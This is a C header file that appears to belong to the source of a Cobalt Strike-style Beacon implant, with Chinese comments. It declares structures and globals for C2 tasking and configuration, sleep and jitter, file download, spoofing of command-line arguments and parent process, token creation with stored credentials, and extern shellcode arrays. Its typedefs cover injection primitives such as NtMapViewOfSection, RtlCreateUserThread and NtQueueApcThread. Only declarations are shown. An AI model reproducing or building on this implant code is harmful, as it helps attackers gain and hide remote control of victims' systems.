#pragma once
//#include "veil.h"
#include "Veil/Veil.h"
#include <stdio.h>
#include <windows.h>
#include "c2profile.h"
#ifdef _MSC_VER
#pragma warning(disable:4005)
#endif


typedef DWORD uint32;
typedef unsigned __int64 uint64;
#define __PAIR64__(high, low) (((uint64) (high) << 32) | (uint32)(low))

#define LAST_IND(x,part_type) (sizeof(x)/sizeof(part_type) - 1)
#if defined(__BYTE_ORDER) && __BYTE_ORDER == __BIG_ENDIAN
# define LOW_IND(x,part_type) LAST_IND(x,part_type)
# define HIGH_IND(x,part_type) 0
#else
# define HIGH_IND(x,part_type) LAST_IND(x,part_type)
# define LOW_IND(x,part_type) 0
#endif
#define DWORDn(x, n) (*((DWORD*)&(x)+n))
#define HIDWORD(x) DWORDn(x,HIGH_IND(x,DWORD))

#include <TlHelp32.h>
#pragma warning(disable : 4200)
typedef struct
{
	int id; /*任务id*/
	int length; /*长度*/
	char data[]; /*data*/
} BeaconTask;

typedef struct
{
	char* path; /*进程路径*/
	int path_size; /*进程路径长度*/
	STARTUPINFOA* pSTARTUPINFOA;
	PROCESS_INFORMATION* pPROCESS_INFORMATION;
	DWORD dwCreationFlags;
	BOOL ignoreToken;
} BeaconStartProcess;

struct BeaconSpoofArgs{
	BOOL state;
	char cmd1[8192];
	char cmd2[8192];
	BeaconSpoofArgs* Linked;
};

typedef struct
{
	char* cmd2;
	char* cmd;
	int field_8;
} BeaconParameterSpoofing;

extern BeaconSpoofArgs* gBeaconParameterSpoofing;


struct BeaconCreateprocess
{
	HANDLE process;

	void* data;
	int data_size;
	int SetErrorMode_value;
	int(__cdecl* ProcessSettings)(BeaconCreateprocess* pBeaconCreateprocess, DWORD dwProcessId, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, STARTUPINFOA* psi);
	void(__cdecl* func2)(BeaconCreateprocess*);
};

struct BeaconDownload
{
	DWORD number;
	DWORD size;
	FILE* fp;
	BeaconDownload* Linked;
};
extern int download_number;
extern BeaconDownload* gBeaconDownload;

typedef struct
{
	HANDLE hProcess;
	HANDLE hThread;
	DWORD Process_PID;
	BOOL is_process_arch;
	BOOL Flag_FALSE;
	BOOL is_system_process;
	BOOL is_Process_self;
	BOOL ishThread;
}BeaconProcessInject;

#include "macro.h"
/*Beacon dll加载基址*/
extern HINSTANCE Beacon_Dllbase;

/*Beacon C2配置信息*/
extern char* CsC2Config;

extern unsigned char rawData[4096];


extern int g_dwMilliseconds;
extern int g_jitter;

//dns相关这些应该已经被遗弃了
extern DWORD init_WSA;
extern DWORD dns_sleep;
extern DWORD dns_idle;
extern char* dns_get_A;
extern char* dns_get_AAAA;
extern char* dns_get_TXT;
extern char* dns_Listeneroptions_dnsresolver;

//系统版本
extern DWORD g_dwMajorVersion;

extern char g_Encryption_Metadata[0x400];
extern int g_Encryption_Metadata_size;

/*和beacon元数据的初始化次数有关*/
extern int MetadataNumber;

extern int g_BeaconStart;


extern char g_post_url[3296];

extern size_t g_withdatasize;

extern DWORD gBeaconPPID;

extern int Create_token_Flag;

extern LPCWSTR lpWideCharStr;
extern LPCWSTR lpDomain;
extern LPCWSTR lpPassword;

extern char* spawntoPath_x64;
extern char* spawntoPath_x86;

extern int gBeaconBlockDLL;

//shellcode x86
extern unsigned char sub_10033020[76];

//shellcode x86
extern unsigned char sub_10033070[297];

//后台线程
extern int BackgroundThreadsNumber;

extern PVOID lpStartAddress;

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
	HANDLE sectionHandle, 
	HANDLE processHandle, 
	PVOID* baseAddress,
	ULONG_PTR zeroBits, 
	SIZE_T commitSize, 
	PLARGE_INTEGER sectionOffset,
	PSIZE_T viewSize, 
	ULONG inheritDisposition,
	ULONG allocationType, 
	ULONG win32Protect);


typedef NTSTATUS(WINAPI* RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT CLIENT_ID* ClientID);

typedef NTSTATUS(WINAPI* NtQueueApcThread_t)(
	HANDLE ThreadHandle, 
	PIO_APC_ROUTINE ApcRoutine, 
	PVOID ApcRoutineContext OPTIONAL, 
	PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, 
	ULONG ApcReserved OPTIONAL);

typedef HANDLE(WINAPI* CreateThread_t) (
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	 __drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);
//自添加
extern HANDLE galaEvent;
